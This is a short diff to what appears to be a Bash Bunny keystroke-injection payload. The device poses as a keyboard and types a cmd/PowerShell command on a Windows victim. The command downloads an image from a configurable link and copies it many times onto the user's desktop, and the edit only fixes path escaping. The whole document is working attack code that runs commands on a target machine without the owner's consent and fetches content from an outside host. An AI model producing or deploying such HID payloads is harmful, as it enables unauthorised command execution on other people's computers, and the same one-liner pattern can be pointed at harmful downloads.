@@ -35,7 +35,7 @@ ATTACKMODE HID
 
 LED Y
 
-RUN WIN "cmd /c powershell \"curl $ImageLink -O C:\Users\%USERNAME%\Desktop\$ImageName.jpg;sleep 1;1..$Amount | % { copy-Item \"C:\Users\%USERNAME%\desktop\$ImageName.jpg\" \"C:\Users\%USERNAME%\desktop\$ImageName\$_.jpg\"}\""
+RUN WIN "cmd /c powershell \"curl $ImageLink -O C:\Users\%USERNAME%\Desktop\\$ImageName.jpg;sleep 1;1..$Amount | % { copy-Item \"C:\Users\%USERNAME%\desktop\\$ImageName.jpg\" \"C:\Users\%USERNAME%\desktop\\$ImageName\$_.jpg\"}\""
 
 Q ENTER
 
